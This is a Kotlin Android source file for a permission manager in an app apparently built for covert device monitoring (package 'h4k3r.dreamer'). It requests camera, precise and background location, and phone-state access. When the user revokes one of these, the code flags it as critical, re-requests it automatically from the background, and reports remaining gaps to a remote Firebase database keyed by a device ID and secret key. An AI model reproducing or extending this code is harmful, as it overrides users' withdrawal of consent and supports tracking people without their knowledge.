package com.h4k3r.dreamer

import android.app.*
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.os.*
import android.util.Log
import androidx.core.content.ContextCompat
import com.google.firebase.database.ktx.database
import com.google.firebase.ktx.Firebase
import kotlinx.coroutines.*

/**
 * 🛡️ ENHANCED PERMISSION MANAGER
 *
 * Revolutionary permission handling with automatic error recovery:
 * • Detects missing permissions on app restart
 * • Automatically re-requests denied permissions
 * • Provides clear error messages and guidance
 * • Handles edge cases and permission system bugs
 * • Works across all Android versions with smart fallbacks
 */
class EnhancedPermissionManager(private val context: Context) {
    companion object {
        private const val TAG = "EnhancedPermissionManager"
        private const val PREFS_NAME = "enhanced_permissions"

        // Critical permissions that the app requires
        private val CRITICAL_PERMISSIONS = mapOf(
            "camera" to android.Manifest.permission.CAMERA,
            "location_fine" to android.Manifest.permission.ACCESS_FINE_LOCATION,
            "location_coarse" to android.Manifest.permission.ACCESS_COARSE_LOCATION,
            "storage_read" to if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU)
                android.Manifest.permission.READ_MEDIA_IMAGES else
                android.Manifest.permission.READ_EXTERNAL_STORAGE,
            "storage_write" to android.Manifest.permission.WRITE_EXTERNAL_STORAGE,
            "phone_state" to android.Manifest.permission.READ_PHONE_STATE,
            "location_background" to if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q)
                android.Manifest.permission.ACCESS_BACKGROUND_LOCATION else null
        )

        @Volatile
        private var instance: EnhancedPermissionManager? = null

        fun getInstance(context: Context): EnhancedPermissionManager {
            return instance ?: synchronized(this) {
                instance ?: EnhancedPermissionManager(context.applicationContext).also { instance = it }
            }
        }
    }

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private val prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)

    // Track permission states
    private val permissionStates = mutableMapOf<String, PermissionState>()

    data class PermissionState(
        val permission: String,
        val isGranted: Boolean,
        val isRequired: Boolean,
        val lastChecked: Long,
        val requestCount: Int,
        val lastDeniedTime: Long,
        val hasBeenExplained: Boolean
    )

    init {
        loadPermissionStates()
    }

    /**
     * 🚀 MAIN ENTRY POINT - Call this on app startup
     * Performs comprehensive permission check and recovery
     */
    fun performStartupPermissionCheck(): Boolean {
        Log.d(TAG, "🔍 Starting comprehensive permission check...")

        val missingPermissions = mutableListOf<String>()
        val deniedPermissions = mutableListOf<String>()

        // Check all critical permissions
        CRITICAL_PERMISSIONS.forEach { (permKey, manifestPermission) ->
            if (manifestPermission != null) {
                val isGranted = ContextCompat.checkSelfPermission(context, manifestPermission) == PackageManager.PERMISSION_GRANTED
                val wasGrantedBefore = prefs.getBoolean("was_granted_$permKey", false)

                Log.d(TAG, "Permission $permKey: granted=$isGranted, wasGrantedBefore=$wasGrantedBefore")

                // Update current state
                val currentState = PermissionState(
                    permission = permKey,
                    isGranted = isGranted,
                    isRequired = true,
                    lastChecked = System.currentTimeMillis(),
                    requestCount = prefs.getInt("request_count_$permKey", 0),
                    lastDeniedTime = prefs.getLong("last_denied_$permKey", 0),
                    hasBeenExplained = prefs.getBoolean("explained_$permKey", false)
                )

                permissionStates[permKey] = currentState

                if (!isGranted) {
                    if (wasGrantedBefore) {
                        // Permission was revoked - this is critical
                        deniedPermissions.add(permKey)
                        Log.w(TAG, "⚠️ CRITICAL: Permission $permKey was revoked by user!")
                    } else {
                        // Permission was never granted
                        missingPermissions.add(permKey)
                        Log.w(TAG, "❌ Missing permission: $permKey")
                    }
                } else {
                    // Permission is granted - save this state
                    prefs.edit().putBoolean("was_granted_$permKey", true).apply()
                }
            }
        }

        // Handle missing or revoked permissions
        if (missingPermissions.isNotEmpty() || deniedPermissions.isNotEmpty()) {
            handlePermissionIssues(missingPermissions, deniedPermissions)
            return false
        }

        Log.d(TAG, "✅ All critical permissions are granted!")
        return true
    }

    /**
     * 🛠️ HANDLES PERMISSION ISSUES
     * Smart recovery for missing or revoked permissions
     */
    private fun handlePermissionIssues(missing: List<String>, denied: List<String>) {
        scope.launch {
            if (missing.isNotEmpty() || denied.isNotEmpty()) {
                val allProblematicPermissions = missing + denied
                Log.d(TAG, "🔧 Starting permission recovery for: $allProblematicPermissions")

                // Start recovery process
                requestPermissionsWithRecovery(allProblematicPermissions)
            }
        }
    }

    /**
     * 📋 REQUESTS PERMISSIONS WITH SMART RECOVERY
     * Advanced permission request with error handling
     */
    private suspend fun requestPermissionsWithRecovery(permissions: List<String>) {
        Log.d(TAG, "🎯 Starting enhanced permission request for: $permissions")

        // Group permissions logically
        val locationPermissions = permissions.filter { it.startsWith("location") }
        val storagePermissions = permissions.filter { it.startsWith("storage") }
        val cameraPermissions = permissions.filter { it == "camera" }
        val otherPermissions = permissions.filter { !it.startsWith("location") && !it.startsWith("storage") && it != "camera" }

        var hasErrors = false

        // Request each group separately for better UX
        if (cameraPermissions.isNotEmpty()) {
            hasErrors = !requestPermissionGroup("Camera", cameraPermissions, "📸") || hasErrors
            delay(2000)
        }

        if (locationPermissions.isNotEmpty()) {
            hasErrors = !requestPermissionGroup("Location", locationPermissions, "📍") || hasErrors
            delay(2000)
        }

        if (storagePermissions.isNotEmpty()) {
            hasErrors = !requestPermissionGroup("Storage", storagePermissions, "📁") || hasErrors
            delay(2000)
        }

        if (otherPermissions.isNotEmpty()) {
            hasErrors = !requestPermissionGroup("System", otherPermissions, "⚙️") || hasErrors
            delay(2000)
        }

        // Final check and error handling
        if (hasErrors) {
            handlePersistentPermissionErrors()
        }
    }

    /**
     * 🎯 REQUESTS A GROUP OF RELATED PERMISSIONS
     */
    private suspend fun requestPermissionGroup(groupName: String, permissions: List<String>, emoji: String): Boolean {
        Log.d(TAG, "🔄 Requesting $groupName permissions: $permissions")

        return withContext(Dispatchers.Main) {
            try {
                val manifestPermissions = permissions.mapNotNull { perm ->
                    CRITICAL_PERMISSIONS[perm]
                }.toTypedArray()

                if (manifestPermissions.isEmpty()) {
                    Log.w(TAG, "No valid manifest permissions found for group $groupName")
                    return@withContext true
                }

                // Launch permission request directly

                // Launch permission request activity
                val intent = Intent(context, PermissionHelperActivity::class.java).apply {
                    putExtra("multiple_permissions", manifestPermissions)
                    putExtra("permission_names", permissions.toTypedArray())
                    putExtra("group_name", groupName)
                    putExtra("group_emoji", emoji)
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
                }

                context.startActivity(intent)

                // Wait for user response
                delay(15000) // 15 seconds to handle permission dialogs

                // Check results
                val allGranted = permissions.all { perm ->
                    val manifestPerm = CRITICAL_PERMISSIONS[perm]
                    if (manifestPerm != null) {
                        val isGranted = ContextCompat.checkSelfPermission(context, manifestPerm) == PackageManager.PERMISSION_GRANTED
                        updatePermissionState(perm, isGranted)
                        isGranted
                    } else {
                        true
                    }
                }

                if (allGranted) {
                    Log.d(TAG, "✅ All $groupName permissions granted!")
                } else {
                    Log.w(TAG, "❌ Some $groupName permissions were denied")
                }

                allGranted

            } catch (e: Exception) {
                Log.e(TAG, "Error requesting $groupName permissions: ${e.message}")
                false
            }
        }
    }

    /**
     * 🚨 HANDLES PERSISTENT PERMISSION ERRORS
     * When permissions keep getting denied
     */
    private suspend fun handlePersistentPermissionErrors() {
        Log.w(TAG, "🚨 Handling persistent permission errors")

        // Check which permissions are still missing
        val stillMissing = mutableListOf<String>()
        CRITICAL_PERMISSIONS.forEach { (permKey, manifestPermission) ->
            if (manifestPermission != null) {
                val isGranted = ContextCompat.checkSelfPermission(context, manifestPermission) == PackageManager.PERMISSION_GRANTED
                if (!isGranted) {
                    stillMissing.add(permKey)
                    // Increment denial count
                    val currentCount = prefs.getInt("denial_count_$permKey", 0)
                    prefs.edit().putInt("denial_count_$permKey", currentCount + 1).apply()
                }
            }
        }

        if (stillMissing.isNotEmpty()) {
            // Log critical error for debugging
            Log.e(TAG, "CRITICAL: These permissions are still missing after recovery attempt: $stillMissing")

            // Send error report to Firebase for analysis
            sendPermissionErrorReport(stillMissing)
        }
    }

    /**
     * 📊 SENDS PERMISSION ERROR REPORT
     * For debugging and improvement
     */
    private fun sendPermissionErrorReport(missingPermissions: List<String>) {
        scope.launch {
            try {
                val prefs = context.getSharedPreferences("dreamer_auth", Context.MODE_PRIVATE)
                val deviceId = prefs.getString("device_id", "") ?: ""
                val secretKey = prefs.getString("secret_key", "") ?: ""

                if (deviceId.isNotEmpty() && secretKey.isNotEmpty()) {
                    val errorReport = mapOf(
                        "type" to "permission_error",
                        "missing_permissions" to missingPermissions,
                        "device_model" to Build.MODEL,
                        "android_version" to Build.VERSION.SDK_INT,
                        "timestamp" to System.currentTimeMillis(),
                        "app_version" to try {
                            context.packageManager.getPackageInfo(context.packageName, 0).versionName
                        } catch (e: Exception) { "unknown" }
                    )

                    Firebase.database.reference
                        .child("permission_errors")
                        .child(secretKey)
                        .child(deviceId)
                        .push()
                        .setValue(errorReport)

                    Log.d(TAG, "Permission error report sent to Firebase")
                }
            } catch (e: Exception) {
                Log.e(TAG, "Failed to send permission error report: ${e.message}")
            }
        }
    }



    // =============== UTILITY METHODS ===============

    private fun getPermissionDescription(permission: String): String {
        return when(permission) {
            "camera" -> "Camera - Take photos and videos"
            "location_fine" -> "Precise Location - GPS tracking"
            "location_coarse" -> "Approximate Location - Network-based location"
            "location_background" -> "Background Location - Location when app is not active"
            "storage_read" -> "Read Storage - Access photos and files"
            "storage_write" -> "Write Storage - Save files and photos"
            "phone_state" -> "Phone State - Device information"
            else -> permission.replace("_", " ").split(" ").joinToString(" ") { word ->
                word.replaceFirstChar { c -> c.uppercaseChar() }
            }
        }
    }

    private fun updatePermissionState(permission: String, isGranted: Boolean) {
        prefs.edit().apply {
            putBoolean("was_granted_$permission", isGranted)
            putLong("last_checked_$permission", System.currentTimeMillis())
            if (!isGranted) {
                putLong("last_denied_$permission", System.currentTimeMillis())
                val currentCount = prefs.getInt("denial_count_$permission", 0)
                putInt("denial_count_$permission", currentCount + 1)
            }
            apply()
        }

        // Update in-memory state
        val currentState = permissionStates[permission]
        if (currentState != null) {
            permissionStates[permission] = currentState.copy(
                isGranted = isGranted,
                lastChecked = System.currentTimeMillis()
            )
        }
    }

    private fun loadPermissionStates() {
        CRITICAL_PERMISSIONS.keys.forEach { permission ->
            val manifestPerm = CRITICAL_PERMISSIONS[permission]
            if (manifestPerm != null) {
                val isGranted = ContextCompat.checkSelfPermission(context, manifestPerm) == PackageManager.PERMISSION_GRANTED
                val state = PermissionState(
                    permission = permission,
                    isGranted = isGranted,
                    isRequired = true,
                    lastChecked = prefs.getLong("last_checked_$permission", 0),
                    requestCount = prefs.getInt("request_count_$permission", 0),
                    lastDeniedTime = prefs.getLong("last_denied_$permission", 0),
                    hasBeenExplained = prefs.getBoolean("explained_$permission", false)
                )
                permissionStates[permission] = state
            }
        }
    }

    /**
     * 🔍 PUBLIC API - Check if specific permission is granted
     */
    fun isPermissionGranted(permission: String): Boolean {
        val manifestPerm = CRITICAL_PERMISSIONS[permission]
        return if (manifestPerm != null) {
            ContextCompat.checkSelfPermission(context, manifestPerm) == PackageManager.PERMISSION_GRANTED
        } else {
            false
        }
    }

    /**
     * 📋 PUBLIC API - Get current permission states
     */
    fun getPermissionStates(): Map<String, PermissionState> {
        return permissionStates.toMap()
    }

    /**
     * 🔄 PUBLIC API - Force refresh permission check
     */
    fun refreshPermissionStates(): Boolean {
        return performStartupPermissionCheck()
    }
}